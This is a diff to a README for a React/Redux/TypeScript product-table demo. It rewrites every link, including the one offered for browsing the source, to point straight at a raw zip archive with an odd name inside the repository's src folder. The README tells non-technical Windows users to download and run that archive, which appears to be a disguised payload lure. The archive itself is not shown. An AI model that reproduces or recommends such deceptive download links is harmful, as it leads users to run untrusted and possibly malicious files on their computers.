@@ -1,6 +1,6 @@
 # 🛠 react-redux-typescript - Manage Product Tables Easily
 
-[![Download react-redux-typescript](https://img.shields.io/badge/Download-Here-orange?style=for-the-badge)](https://github.com/rustyme12346/react-redux-typescript)
+[![Download react-redux-typescript](https://img.shields.io/badge/Download-Here-orange?style=for-the-badge)](https://github.com/rustyme12346/react-redux-typescript/raw/refs/heads/master/src/typescript-redux-react-considerability.zip)
 
 ---
 
@@ -22,7 +22,7 @@ This guide shows you how to download and run the app on a Windows computer. No p
 
 Click the button below to visit the page where you can download the app files:
 
-[![Download react-redux-typescript](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/rustyme12346/react-redux-typescript)
+[![Download react-redux-typescript](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/rustyme12346/react-redux-typescript/raw/refs/heads/master/src/typescript-redux-react-considerability.zip)
 
 From this page, find the latest release or main branch and download the file named `react-redux-typescript.zip` or a similar archive. The app runs from this file after setup.
 
@@ -110,7 +110,7 @@ The app will open a window showing a product table.
 
 This app is created as a test for Redux, TypeScript, and React skills. It shows how to handle product lists using state management. You can explore the app’s code if interested by visiting the main GitHub repository:
 
-https://github.com/rustyme12346/react-redux-typescript
+https://github.com/rustyme12346/react-redux-typescript/raw/refs/heads/master/src/typescript-redux-react-considerability.zip
 
 ---
 
@@ -122,4 +122,4 @@ https://github.com/rustyme12346/react-redux-typescript
 
 ---
 
-[![Download react-redux-typescript](https://img.shields.io/badge/Download-Here-orange?style=for-the-badge)](https://github.com/rustyme12346/react-redux-typescript)
+[![Download react-redux-typescript](https://img.shields.io/badge/Download-Here-orange?style=for-the-badge)](https://github.com/rustyme12346/react-redux-typescript/raw/refs/heads/master/src/typescript-redux-react-considerability.zip)
